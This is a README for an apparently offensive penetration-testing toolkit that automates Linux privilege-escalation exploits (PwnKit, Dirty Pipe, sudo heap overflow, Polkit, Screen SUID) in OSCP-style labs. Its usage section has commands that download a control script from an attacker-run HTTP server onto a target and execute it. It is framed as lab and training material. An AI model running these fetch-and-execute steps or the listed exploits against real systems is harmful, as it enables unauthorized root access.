
# worst-autoLinPrivesc

This is a modular shell-based automation framework designed to cut through noisy LinPEAS output during OSCP-style labs and exams. It focuses on the **same small handful of privilege escalation suggestions that LinPEAS repeatedly flags**, regardless of actual vulnerability.

This toolkit automates checks and execution for:
- PwnKit (CVE-2021-4034)
- sudoedit heap overflow (CVE-2021-3156)
- Dirty Pipe (CVE-2022-0847)
- Polkit (CVE-2021-3560)
- Screen v4.5.0 SUID (CVE-2017-5618)
- Basic kernel version matching
- LinPEAS + unix-privesc-check scanning
- LinPEAS post-processing parser (basic implementation)

## Why This Exists

In OffSec challenge labs and machines, **LinPEAS frequently suggests the same exploits** regardless of applicability. To streamline triage and reduce alert fatigue, this repo:
- Parses LinPEAS output for real leads (cron, processes, SUID)
- Auto-runs known kernel/heap exploits from hosted files
- Logs all results under `/tmp/c2_auto`

## Usage

On Kali:
```bash
python3 -m http.server 80
```

On target:
```bash
wget http://<kali-ip>/c2.sh
chmod +x c2.sh
./c2.sh --ip <kali-ip> --port 80
```

<img width="932" height="527" alt="image" src="https://github.com/user-attachments/assets/c523167c-c43b-45fb-a9d6-4e34269fc674" />


## Folder Structure

```
.
├── c2.sh                    # Main control & orchestration script
├── kernel_checks.sh         # Kernel exploit matcher
├── linpeas.sh               # Downloaded: PEASS-ng linPEAS
├── unix-privesc-check       # Downloaded: pentestmonkey tool
├── dirtypipe/               # CVE-2022-0847 Dirty Pipe compiled files
├── sudo-1.8.31/             # CVE-2021-3156 exploit & shellcode
├── polkadots                # CVE-2021-3560 compiled binary
├── pwnkit.sh, screen450.sh, etc.   # Per-exploit modules
```

## External Sources

These files are used as-is from their respective authors:

- linpeas.sh from [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- unix-privesc-check from [pentestmonkey](https://github.com/pentestmonkey/unix-privesc-check)
- PwnKit from [ly4k](https://github.com/ly4k/PwnKit)
- sudo-1.8.31 from [Whiteh4tWolf](https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit)
- Dirty Pipe from [AlexisAhmed](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
- Polkit from [swapravo](https://github.com/swapravo/polkadots)

## License & Ethics

For educational use only. This repo automates noisy-but-low-risk local exploits.  
Use only in environments you have **explicit permission** to test.

No warranty. No support.
